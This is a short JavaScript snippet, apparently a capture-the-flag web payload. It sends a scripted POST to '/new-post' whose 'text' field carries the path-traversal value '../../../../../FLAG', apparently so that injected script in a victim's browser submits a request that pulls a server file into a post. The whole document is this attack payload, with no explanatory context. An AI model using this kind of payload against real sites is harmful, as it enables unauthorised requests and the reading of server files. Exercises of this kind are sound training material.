var post_data = 'title=TestTitle&text=../../../../../FLAG';
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", "/new-post", true);
xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send(post_data);
